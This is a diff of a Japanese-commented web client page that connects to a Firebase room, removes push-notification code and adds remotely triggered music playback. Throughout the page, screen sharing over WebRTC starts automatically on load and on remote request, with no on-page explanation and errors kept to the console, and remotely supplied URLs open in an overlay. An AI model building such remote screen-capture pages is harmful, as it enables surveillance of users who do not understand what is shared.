@@ -1,15 +1,12 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
- <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
-<!-- またはDataURL埋め込み -->
-<link rel="icon" type="image/png" sizes="16x16" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACbElEQVR4AZxRTWsUQRB91TOzn7ObNYKJp0gkNxGMLEHBD9Ac/MCLevFi/oGHqGwQEhJFApqDV0/iQRBPERFEMOhFgh4ET8GAiiAGVIzJZjYzs9O+7s4XHtMz1d1VXe/V62oVdnTrsLZ726Yggv+HiAfl+Qh8H54XwFM+fLMyZs625qutjtmL8hAEPirlMmq1KnbQwmqICq3WUYXvexAlJtWasjMnWYt5PAzDIm6N38DpU4P4PP8RvXt6MFA/iPm5D45AryUTt0kAF/T9AN27ujA0dAk7OzuZArx+9RxPHj/A4SMnmSXQNuomSyAMZ4x6vGepmMfevj4mKRQKJWitMXHzNrMVqpUKPGUgQt/9xgOzIVohF/jo7urCo4f3SQmMNIZx5+495PIFJEmMly+eIlcIwFs6NGdHIBriaZSKJcy+ncH4xCSP3H/t6hULphDMzLzha/gkcDBTZW0HSvNRLOVhxthowywb1rg+jMbIKOr1fmjzseD6oVND+RBBkM+txzdW04MkSTA1NYlyWMbKSguZziAmQwNOgSKvTpHECbIss2YaY/bxagwDOHPuAnp696FFH5kYOEkEhMIOkiFqRVDUlKYp4jhGFEUEtNjcHObmPqHZXEE7SfkybYsxRZwCojVjUbOF8xcv28OYasxmjA3df+AQFheXkKZMQsYugNVhhyXQdDWlx3yq2Xfv0V8/huODZzFw9ASmp5/h1+8/VJSwYEaQk292mp4loCaQA+22xnJzGT8WFvD1yzcsfP+Jxb9LFqwpUbO2MUcBO5QiUhT3JkoVbcpcZaPiVsz7R5S9eWcRgYjYZBGBAPgHAAD//7hBH7QAAAAGSURBVAMAEqP2gtYcs3QAAAAASUVORK5CYII=">
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="theme-color" content="#000000">
 <title>Client</title>
 <link rel="manifest" href="./manifest.json">
-<link rel="apple-touch-icon" href="./icons/icon-192.png">
+<link rel="apple-touch-icon" href="./icon-192.png">
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   html, body {
@@ -46,12 +43,28 @@
     padding: 4px 10px; border-radius: 999px; display: none;
   }
   #status.offline { color: #ff8c8c; }
+
+  /* 音楽表示 */
+  #musicInfo {
+    position: fixed; bottom: 12px; left: 12px; z-index: 25;
+    font-size: 11px; color: #a78bfa;
+    background: rgba(0,0,0,0.7);
+    padding: 6px 12px; border-radius: 999px;
+    display: none;
+    max-width: 70%;
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+  }
+  #musicInfo.playing { display: block; }
+  #musicInfo::before {
+    content: "🎵 ";
+  }
 </style>
 </head>
 <body>
 
 <canvas id="particles"></canvas>
 <div id="status">online</div>
+<div id="musicInfo"></div>
 
 <div id="overlay">
   <div class="bar">
@@ -66,11 +79,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/fireba
 import {
   getDatabase, ref, onValue, set, push, update, remove, onDisconnect
 } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
-import {
-  getMessaging, getToken, onMessage
-} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-messaging.js";
 
-// ===== Firebase 設定 =====
 const firebaseConfig = {
   apiKey: "AIzaSyDsoktNvfhnMSBrHLyhSjgLBLYiih7cMFE",
   authDomain: "doong-672e7.firebaseapp.com",
@@ -80,79 +89,28 @@ const firebaseConfig = {
   messagingSenderId: "95643976140",
   appId: "1:95643976140:web:cdcb757a9bc25bc7a75d69"
 };
-
-// ★★★ Firebaseコンソールで取得したVAPIDキーをここに貼ってください ★★★
-const VAPID_KEY = "YOUR_VAPID_PUBLIC_KEY_HERE";
-
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
-// ===== 固定セッションID =====
 const FIXED_SESSION_ID = "doong-room";
 const sessionId = FIXED_SESSION_ID;
 
-// ===== ユーザーID =====
 let userId = sessionStorage.getItem("doongUserId");
 if (!userId) {
   userId = "u-" + Math.random().toString(36).slice(2, 8);
   sessionStorage.setItem("doongUserId", userId);
 }
 
-// ===== Service Worker 登録 =====
-let swReg = null;
+// ===== Service Worker =====
 if ("serviceWorker" in navigator) {
-  navigator.serviceWorker.register("./sw.js").then(reg => {
-    swReg = reg;
-    tryInitFCM();
-  }).catch(()=>{});
+  navigator.serviceWorker.register("./sw.js").catch(()=>{});
 }
 
-// ===== 通知許可（自動で聞かない、初回だけ一度） =====
+// ===== 通知許可 =====
 let isForeground = true;
 document.addEventListener("visibilitychange", () => {
   isForeground = document.visibilityState === "visible";
 });
-
-// ===== FCM 初期化（バックグラウンド通知用） =====
-let fcmToken = null;
-async function tryInitFCM() {
-  if (!("Notification" in window)) return;
-  if (Notification.permission !== "granted") return;
-
-  try {
-    const messaging = getMessaging(app);
-    fcmToken = await getToken(messaging, {
-      vapidKey: VAPID_KEY,
-      serviceWorkerRegistration: swReg
-    });
-    if (fcmToken) {
-      console.log("FCM token取得:", fcmToken);
-      // トークンをFirebaseに保存（管理者が後でプッシュ送信に使える）
-      set(ref(db, `sessions/${sessionId}/users/${userId}/fcmToken`), fcmToken);
-    }
-
-    // フォアグラウンド時のプッシュ受信
-    onMessage(messaging, (payload) => {
-      const title = payload.notification?.title || "通知";
-      const body = payload.notification?.body || "";
-      try { new Notification(title, { body }); } catch(e){}
-    });
-  } catch (e) {
-    console.warn("FCM初期化スキップ:", e.message);
-  }
-}
-
-// 通知許可をユーザーの初回クリック時に要求（画面のどこかタップでOK）
-function ensureNotificationPermission() {
-  if ("Notification" in window && Notification.permission === "default") {
-    Notification.requestPermission().then(perm => {
-      if (perm === "granted") tryInitFCM();
-    });
-  }
-}
-// 最初のタップで通知許可を促す
-document.addEventListener("click", ensureNotificationPermission, { once: true });
-document.addEventListener("touchstart", ensureNotificationPermission, { once: true });
 
 // ===== オンライン状態 =====
 const statusRef = ref(db, `sessions/${sessionId}/users/${userId}/status`);
@@ -161,9 +119,6 @@ onDisconnect(statusRef).set({ online: false, lastSeen: Date.now() });
 setInterval(() => update(statusRef, { lastSeen: Date.now() }), 10000);
 
 window.addEventListener("pagehide", () => {
-  remove(ref(db, `sessions/${sessionId}/users/${userId}`));
-});
-window.addEventListener("beforeunload", () => {
   remove(ref(db, `sessions/${sessionId}/users/${userId}`));
 });
 
@@ -193,14 +148,13 @@ function handleCommand(cmd) {
   if (cmd.url) openOverlay(cmd.url);
 }
 
-// ===== 画面共有要求の監視 =====
+// ===== 画面共有要求 =====
 let lastShareReqTs = 0;
 onValue(ref(db, `sessions/${sessionId}/shareRequest`), (snap) => {
   const req = snap.val();
   if (!req || !req.ts) return;
   if (req.ts > lastShareReqTs) {
     lastShareReqTs = req.ts;
-    // 自動で共有を試みる（ブラウザが許可ダイアログを出す）
     autoStartShare();
   }
 });
@@ -214,7 +168,7 @@ onValue(ref(db, `sessions/${sessionId}/users/${userId}/shareRequest`), (snap) =>
   }
 });
 
-// ===== Overlay 制御 =====
+// ===== Overlay =====
 function openOverlay(url) {
   const overlay = document.getElementById("overlay");
   const frame = document.getElementById("contentFrame");
@@ -240,14 +194,94 @@ function closeOverlay() {
 }
 document.getElementById("closeOverlay").onclick = closeOverlay;
 
-// ===== WebRTC 画面共有 =====
+// ===== 音楽再生 =====
+const musicEl = document.getElementById("musicInfo");
+let audioEl = null;              // 現在再生中のAudio
+let lastMusicTs = 0;
+let userInteracted = false;      // ユーザーがタップしたか
+
+// ユーザーの最初のタップを検知（自動再生制限対策）
+document.addEventListener("click", () => { userInteracted = true; }, { once: true });
+document.addEventListener("touchstart", () => { userInteracted = true; }, { once: true });
+
+function playMusic(url) {
+  if (!url) return;
+
+  // 既存のAudioを停止
+  if (audioEl) {
+    audioEl.pause();
+    audioEl.currentTime = 0;
+    audioEl = null;
+  }
+
+  audioEl = new Audio(url);
+  audioEl.loop = true;
+  audioEl.volume = 1.0;
+
+  musicEl.textContent = url;
+  musicEl.classList.add("playing");
+
+  audioEl.play().catch((err) => {
+    // 自動再生がブロックされた → ユーザー操作が必要
+    console.warn("自動再生ブロック:", err.message);
+    musicEl.textContent = url + " （タップで再生）";
+
+    // 一度だけユーザー操作で再生を試みる
+    const resume = () => {
+      audioEl && audioEl.play().catch(()=>{});
+      document.removeEventListener("click", resume);
+      document.removeEventListener("touchstart", resume);
+    };
+    document.addEventListener("click", resume, { once: true });
+    document.addEventListener("touchstart", resume, { once: true });
+  });
+}
+
+function stopMusic() {
+  if (audioEl) {
+    audioEl.pause();
+    audioEl.currentTime = 0;
+    audioEl = null;
+  }
+  musicEl.classList.remove("playing");
+  musicEl.textContent = "";
+}
+
+// 全体向け音楽
+onValue(ref(db, `sessions/${sessionId}/music`), (snap) => {
+  const m = snap.val();
+  if (!m || !m.timestamp) return;
+  if (m.timestamp <= lastMusicTs) return;
+  lastMusicTs = m.timestamp;
+
+  if (m.play && m.url) {
+    playMusic(m.url);
+  } else {
+    stopMusic();
+  }
+});
+
+// 個別向け音楽
+onValue(ref(db, `sessions/${sessionId}/users/${userId}/music`), (snap) => {
+  const m = snap.val();
+  if (!m || !m.timestamp) return;
+  if (m.timestamp <= lastMusicTs) return;
+  lastMusicTs = m.timestamp;
+
+  if (m.play && m.url) {
+    playMusic(m.url);
+  } else {
+    stopMusic();
+  }
+});
+
+// ===== WebRTC =====
 const rtcConfig = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
 let pc = null;
 let localStream = null;
 let answerApplied = false;
 let isSharing = false;
 
-// 自動で共有開始（ページ読み込み直後にも呼ぶ）
 async function autoStartShare() {
   if (isSharing) return;
   isSharing = true;
@@ -271,26 +305,12 @@ async function autoStartShare() {
 
     await startWebRTC();
   } catch (e) {
-    // ★ アラートは出さない。コンソールのみ
     console.warn("画面共有は開始されませんでした:", e.message);
     isSharing = false;
-    // ユーザーが拒否した場合は、次回要求時にまた試す
   }
 }
 
-// ★ページ読み込み時に自動で共有を試みる（初回は許可ダイアログが出る）
 window.addEventListener("load", () => {
-  // ブラウザのセキュリティにより、初回はユーザー操作が必要な場合がある。
-  // クリック1回で自動共有を試みる。
-  const tryOnce = () => {
-    document.removeEventListener("click", tryOnce);
-    document.removeEventListener("touchstart", tryOnce);
-    autoStartShare();
-  };
-  document.addEventListener("click", tryOnce, { once: true });
-  document.addEventListener("touchstart", tryOnce, { once: true });
-
-  // 既に許可済みなら即開始を試みる
   setTimeout(() => { autoStartShare(); }, 300);
 });
 
@@ -360,7 +380,7 @@ function stopSharing() {
   document.getElementById("status").style.display = "none";
 }
 
-// ===== 粒子アニメーション（白い粒子が上に） =====
+// ===== 粒子アニメーション =====
 const canvas = document.getElementById("particles");
 const ctx = canvas.getContext("2d");
 let particles = [];
